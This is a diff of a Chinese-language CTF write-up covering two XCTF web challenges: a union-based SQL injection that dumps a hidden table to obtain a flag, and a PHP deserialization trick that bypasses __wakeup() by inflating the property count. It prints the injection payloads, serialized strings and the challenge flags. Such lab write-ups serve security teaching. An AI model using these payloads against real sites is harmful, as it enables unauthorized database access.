@@ -444,6 +444,49 @@ print("Cyberpeace{" + flag + "}")
 
 
 
+## NewsCenter
+
++ 打开网页看到一个很朴素的页面，类似一个普通的新闻查询页面，页面正中间有一个搜索框：
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/Hacker_News.png?raw=true)
+
++ 在搜索框中输入任意内容，例如输入 <code>1</code> 发现除了底下 **News** 部分显示出包含字段 <code>1</code> 的新闻以外，什么都没有发生，没有 **alert弹窗** 之类的。
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/01.png?raw=true)
+
++ 猜测可能是 **SQL注入** ，首先尝试如下语句注入 `' and 1 = 1#` 什么都没发生...
++ 修改注入语句如下 `' and 1 = 2#` ，News部分变为空白，显然该 SQL 语句有效。
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/02.png?raw=true)
+
++ 利用union联合注入试探该sql查询返回的列数，首先尝试 1 列 `' and 1 = 2 union select 1#` ，页面跳转显示无法访问，说明不是 1 列。
+
++ `' and 1 = 2 union select 1, 2#` 同样失败。
+
++ `' and 1 = 2 union select 1, 2, 3#` 时，News部分出现内容
+
+  > **2**
+  >
+  > 3
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)
+
++ 于是进一步查询数据库中所有的数据表名 `' and 1 = 2 union select 1, TABLE_SCHEMA, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` ，发现一个 **secret_table** 表：
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/05.png?raw=true)
+
++ 查询 **secret_table** 表中的所有字段 `' and 1 = 2 union select 1, 2, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'secret_table' #` ，发现表中字段如下：
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/06.png?raw=true)
+
++ **fl4g** 字段非常引人注目，猜测可能其中隐藏着 **flag**，因此进一步查询 **fl4g** 的内容 `' and 1 = 2 union select 1, 2, fl4g from secret_table #`
++ 成功得到 flag 。
++ flag: **QCTF{sq1_inJec7ion_ezzz}**
+
+
+
 ## NaNNaNNaNNaN-Batman
 
 + 附件里是个没有后缀的文件，打开看发现很像 **JavaScript** 的代码，但是好多乱码字符...
@@ -503,44 +546,63 @@ delete _
 
 
 
-## NewsCenter
+## unserialize3
 
-+ 打开网页看到一个很朴素的页面，类似一个普通的新闻查询页面，页面正中间有一个搜索框：
++ 打开页面，发现一段不完整的 php 代码：
 
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/Hacker_News.png?raw=true)
+```php
+class xctf{
+public $flag = '111';
+public function __wakeup(){
+exit('bad requests');
+}
+?code=
+```
 
-+ 在搜索框中输入任意内容，例如输入 <code>1</code> 发现除了底下 **News** 部分显示出包含字段 <code>1</code> 的新闻以外，什么都没有发生，没有 **alert弹窗** 之类的。
++ 题目叫做 “unserialize3” ，猜测跟 php 的反序列化有关，可能要在 URL 栏后面补上 `?code='(unserialized string)'` ，即用 GET 方法传参数，参数为该段代码反序列化后的序列。
++ 先将这段不完整的 php 代码补完整：
 
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/01.png?raw=true)
+```php
+<?php
+class xctf{
+	public $flag = '111';
+	public function __wakeup(){
+		exit('bad requests');
+	}
+}
+$obj = new xctf();
+$str = serialize($obj);
+echo $str;
+?>
+```
 
-+ 猜测可能是 **SQL注入** ，首先尝试如下语句注入 `' and 1 = 1#` 什么都没发生...
-+ 修改注入语句如下 `' and 1 = 2#` ，News部分变为空白，显然该 SQL 语句有效。
++ 利用 [php 在线工具](https://c.runoob.com/compile/1)将其序列化，得到序列化后的字符串：
 
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/02.png?raw=true)
+  > O:4:"xctf":1:{s:4:"flag";s:3:"111";}
 
-+ 利用union联合注入试探该sql查询返回的列数，首先尝试 1 列 `' and 1 = 2 union select 1#` ，页面跳转显示无法访问，说明不是 1 列。
++ 将这个字符串作为参数用 GET 方法传入 URL ，得到了一个 “bad request” 的页面。
 
-+ `' and 1 = 2 union select 1, 2#` 同样失败。
++ 仔细阅读代码，发现类 `xctf` 中调用了一个 php 魔术函数 `__wakeup()` ，百度得知该函数会在**类的实例的序列化串被反序列化时触发（被调用）**，而这个函数一旦触发就会直接在网页上显示 bad request 并直接结束；因此要设法让这个函数在反序列化时不被调用。
 
-+ `' and 1 = 2 union select 1, 2, 3#` 时，News部分出现内容
++ 百度关于 php 的序列化和反序列化，了解到 php 序列化的格式如下：
 
-  > **2**
+  > 对象（object）通常被序列化为：
   >
-  > 3
+  > O:<对象名字符长度>:<对象名（字符串）>:<对象包括的属性（字段）数量>:{<对象属性（字段）1类型>:<对象属性（字段）1 的长度>:<对象属性（字段）1 的内容>;<对象属性（字段）1 所对应的字段值类型>:<对象属性（字段）1 所对应的字段值长度>:<对象属性（字段）1 所对应的字段值内容>;<对象属性（字段）2 类型>:<对象属性（字段）2 的长度>:<对象属性（字段）2 的内容>;<对象属性（字段）2 所对应的字段值类型>:<对象属性（字段）2 所对应的字段值长度>:<对象属性（字段）2 所对应的字段值内容>;...;}
+  >
+  > 
+  >
+  > 当序列化字符串中，表示对象属性个数的值大于实际属性个数时，`__wakeup()` 方法将不会被执行。
 
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)
++ 因此，将序列修改为 **O:4:"xctf":2:{s:4:"flag";s:3:"111";}** ，在序列前面加上 `?code=` 后补在 URL 地址后面即可得到 flag 。
 
-+ 于是进一步查询数据库中所有的数据表名 `' and 1 = 2 union select 1, TABLE_SCHEMA, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` ，发现一个 **secret_table** 表：
++ 实际上也可以修改序列中别的值，例如如下的修改方案均可得到 flag 值：
 
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)
+  > + O:3:"xctf":1:{s:4:"flag";s:3:"111";}
+  > + O:4:"xctf":1:{s:3:"flag";s:3:"111";}
+  > + O:4:"xctf":1:{s:4:"flag";s:4:"111";}
 
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/05.png?raw=true)
++ 附上 [php 在线反序列化工具](https://www.w3cschool.cn/tools/index?name=unserialize)。
 
-+ 查询 **secret_table** 表中的所有字段 `' and 1 = 2 union select 1, 2, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'secret_table' #` ，发现表中字段如下：
-
-![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/06.png?raw=true)
-
-+ **fl4g** 字段非常引人注目，猜测可能其中隐藏着 **flag**，因此进一步查询 **fl4g** 的内容 `' and 1 = 2 union select 1, 2, fl4g from secret_table #`
-+ 成功得到 flag 。
-+ flag: **QCTF{sq1_inJec7ion_ezzz}**
++ flag: **cyberpeace{c0b46ec16da5f1d926126639bbeb749e}**
 
